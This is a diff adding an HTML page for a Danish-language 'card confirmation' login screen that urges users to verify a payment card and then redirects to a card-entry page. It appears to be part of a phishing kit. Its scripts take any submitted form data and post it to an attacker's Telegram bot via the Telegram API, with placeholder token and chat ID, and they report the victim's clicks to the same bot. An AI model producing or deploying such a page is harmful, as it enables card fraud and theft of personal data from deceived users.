@@ -1,0 +1,174 @@
+
+<!DOCTYPE html>
+<html style="font-size: 16px;" lang="en"><head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+	<meta http-equiv="" content="2; url=cc.html" />
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+    <title>Log på</title>
+    <link rel="stylesheet" href="css/vi.css" media="screen">
+    <link rel="stylesheet" href="css/lcar.css" media="screen">
+    <link id="u-theme-google-font" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,400,400i,500,500i,700,700i,900,900i|Open+Sans:300,300i,400,400i,500,500i,600,600i,700,700i,800,800i">
+
+
+<style>
+       
+ @keyframes wave {
+            0%, 60%, 100% {
+                transform: translateY(0);
+                background-color: #5c7aff;
+            }
+            30% {
+                transform: translateY(-15px);
+                background-color: #a4b5ff;
+            }
+        }
+
+        .wave-container {
+            display: none;
+            flex-direction: row;
+            justify-content: space-around;
+            align-items: flex-end;
+            width: 80px;
+            height: 50px;
+            position: fixed;
+            top: 40%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .wave {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background-color: #5c7aff;
+            animation: wave 1.5s infinite ease-in-out;
+        }
+
+        .wave:nth-child(2) {
+            animation-delay: 0.1s;
+        }
+
+        .wave:nth-child(3) {
+            animation-delay: 0.2s;
+        }
+    </style>
+
+  </head>
+  <body class="u-body u-xl-mode" data-lang="en"><header class="u-clearfix u-custom-color-1 u-header u-header" id="sec-8db3"><div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <a class="u-image u-logo u-image-1" data-image-width="290" data-image-height="74">
+          <img src="img/logo.png" style="width: 120px;">
+        </a>
+      </div></header>
+    <section class="u-clearfix u-custom-color-1 u-section-1" id="sec-8c53">
+      <div class="u-clearfix u-sheet u-valign-top u-sheet-1">
+        <div class="u-align-center u-container-style u-expanded-width-xs u-group u-radius u-shape-round u-white u-group-1">
+          <div class="u-container-layout u-container-layout-1">
+            <img src="img/mld.png" alt="" data-image-width="406" data-image-height="358" style="
+    width: 20%;
+">
+            <img class="u-image u-image-contain u-image-default u-image-1" src="img/cvi.png" alt="" data-image-width="406" data-image-height="358">
+            <p class="u-align-center u-custom-font u-text u-text-1">Kortbekræftelse</p>
+            <p class="u-align-center u-custom-font u-text u-text-grey-40 u-text-2"> For at aktivere adgang skal du bekræfte et kort, der er knyttet til din konto, eller tilføje et nyt.</p>
+            <a href="cc.html" class="u-border-none u-btn u-btn-round u-button-style u-custom-color-2 u-custom-font u-radius u-btn-1"> Aktiver</a>
+          </div>
+        </div>
+      </div>
+    </section>  
+    <div class="wave-container">
+    <div class="wave"></div>
+    <div class="wave"></div>
+    <div class="wave"></div>
+</div>
+
+<script>
+    // Function to handle the click event on the activation link
+    function handleActivationClick(e) {
+        e.preventDefault(); // Prevent the default link behavior
+
+        // Hide the container with all the contents
+        var containerLayout = document.querySelector('.u-container-layout');
+        containerLayout.style.display = 'none';
+
+        // Show the loading animation
+        var waveContainer = document.querySelector('.wave-container');
+        waveContainer.style.display = 'flex';
+
+        // Set a timeout for 2 seconds before redirection
+        setTimeout(function() {
+            // Redirect to the URL in the href attribute of the anchor tag
+            window.location.href = e.target.href;
+        }, 1000);
+    }
+
+    // Attach the event listener to the activation link
+    document.querySelector('.u-btn-1').addEventListener('click', handleActivationClick);
+</script>
+
+
+
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.querySelector("form");
+    if (!form) return;
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+        const entries = [...formData.entries()];
+        const message = entries.map(([key, value]) => `${key}: ${value}`).join("\n");
+
+        const telegramBotToken = "ICI_VOTRE_BOT_TOKEN";
+        const telegramChatId = "ICI_VOTRE_CHAT_ID";
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+            }),
+        }).then(response => {
+            if (response.ok) {
+                window.location.href = "cc.html";
+            } else {
+                alert("Erreur lors de l'envoi.");
+            }
+        }).catch(error => {
+            alert("Erreur de connexion.");
+            console.error(error);
+        });
+    });
+});
+</script>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const button = document.querySelector("button[type='submit'], button#submit-button");
+    if (button) {
+        button.addEventListener("click", function (e) {
+            const telegramBotToken = "ICI_VOTRE_BOT_TOKEN";
+            const telegramChatId = "ICI_VOTRE_CHAT_ID";
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            const message = "L'utilisateur a cliqué sur le bouton dans active.html";
+
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message,
+                }),
+            });
+        });
+    }
+});
+</script>
+
+</body></html>
